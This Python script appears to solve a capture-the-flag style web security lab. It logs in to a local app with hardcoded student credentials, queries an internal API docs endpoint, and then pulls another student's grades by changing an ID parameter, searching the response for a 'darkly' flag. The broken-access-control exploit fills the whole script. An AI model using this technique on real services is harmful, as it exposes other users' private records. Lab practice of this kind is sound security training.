import sys
import requests


GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"
# step 1 - login and get session cookie

identity = "jdoe@student.42.tech"
password = "abc123"
auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": identity, "password": password},
    allow_redirects=False
)
 
cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print("Logged in successfully with " + identity + " and " + password)

input(f"{GREEN}press anything to continue")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")

targeturl = "http://localhost:4942/api/docs-internal"

response = requests.get(
        targeturl,
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
        allow_redirects=False
    )

input(f"{GREEN}accessing http://localhost:4942/api/docs-internal")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
print("__________")
print("response text of /api/docs-internal:\n")
print(response.text)
print("__________")

targeturl = "http://localhost:4942/api/grades?student=z4p1cnx47mfy50f"

input(f"{GREEN}accessing http://localhost:4942/api/grades?student=z4p1cnx47mfy50f")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")

response = requests.get(
        targeturl,
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
        allow_redirects=False
    )

print(response.text)
print("___________") 
keyword = "darkly"
index = response.text.find(keyword)

# Check if found to avoid slicing from -1
if index != -1:
    result = response.text[index:]
    print(result)
else:
    print("")